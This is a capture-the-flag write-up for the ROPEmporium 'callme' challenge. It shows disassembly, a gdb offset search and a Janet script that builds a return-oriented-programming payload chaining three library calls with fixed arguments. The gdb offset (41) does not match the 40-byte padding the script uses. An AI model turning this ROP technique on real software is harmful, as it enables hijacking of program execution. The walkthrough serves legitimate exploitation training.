# ROPEmporium Challenge 3: callme

```sh
objdump -d callme | nvim -
# kindly, they left us this:
# 000000000040093c <usefulGadgets>:
# 40093c:       5f                      pop    %rdi
# 40093d:       5e                      pop    %rsi
# 40093e:       5a                      pop    %rdx
# 40093f:       c3                      ret
```

```sh
objdump -d libcallme.so | nvim - 
# similar code for callme_one and callme_two: compare three arguments (rdi, rsi, rdx)
# against the values 0xdeadbeefdeadbeef, 0xcafebabecafebabe, and 0xd00df00dd00df00d
# 0000000000000a2d <callme_three>:
#  a2d:   55                      push   %rbp
#  a2e:   48 89 e5                mov    %rsp,%rbp
#  a31:   48 83 ec 30             sub    $0x30,%rsp
#  a35:   48 89 7d e8             mov    %rdi,-0x18(%rbp)
#  a39:   48 89 75 e0             mov    %rsi,-0x20(%rbp)
#  a3d:   48 89 55 d8             mov    %rdx,-0x28(%rbp)
#  a41:   48 b8 ef be ad de ef    movabs $0xdeadbeefdeadbeef,%rax
#  a48:   be ad de
#  a4b:   48 39 45 e8             cmp    %rax,-0x18(%rbp)
#  a4f:   0f 85 2c 01 00 00       jne    b81 <callme_three+0x154>
#  a55:   48 b8 be ba fe ca be    movabs $0xcafebabecafebabe,%rax
#  a5c:   ba fe ca 
#  a5f:   48 39 45 e0             cmp    %rax,-0x20(%rbp)
#  a63:   0f 85 18 01 00 00       jne    b81 <callme_three+0x154>
#  a69:   48 b8 0d f0 0d d0 0d    movabs $0xd00df00dd00df00d,%rax
```

```
gdb ./callme
pattern create 200 pattern.txt
r < pattern.txt
# -- Segmentation fault happens here
x/2wx $rsp # gives us the overwritten return address: 41304141
echo "41304141" | xxd -r -p
# A0AA
pattern offset A0AA
# A0AA found at offset: 41
```

```janet
#!/usr/bin/env janet
(use sh)
# (var input "")
# (set input "deadbeefdeadbeef")
# (print `\x` (string/join (reverse (partition 2 input)) `\x`))
(def input (string/join [(string/repeat 'A 40)
                         "\x3c\x09\x40\x00\x00\x00\x00\x00" # pop rdi, rsi, rdx gadget
                         "\xef\xbe\xad\xde\xef\xbe\xad\xde" # value for rdi
                         "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" # value for rsi
                         "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0" # value for rdx
                         "\x20\x07\x40\x00\x00\x00\x00\x00" # callme_one@plt
                         "\x3c\x09\x40\x00\x00\x00\x00\x00" # pop rdi, rsi, rdx gadget
                         "\xef\xbe\xad\xde\xef\xbe\xad\xde" # value for rdi
                         "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" # value for rsi
                         "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0" # value for rdx
                         "\x40\x07\x40\x00\x00\x00\x00\x00" # callme_two@plt
                         "\x3c\x09\x40\x00\x00\x00\x00\x00" # pop rdi, rsi, rdx gadget
                         "\xef\xbe\xad\xde\xef\xbe\xad\xde" # value for rdi
                         "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" # value for rsi
                         "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0" # value for rdx
                         "\xf0\x06\x40\x00\x00\x00\x00\x00" # callme_three@plt
                         ""]))
(spit "payload.txt" input)
($ ./callme < ,input)
```

Note about GDB:

- b callme_two@plt breaks in the PLT lookup of callme_two
- b callme_two     breaks in the actual callme_two
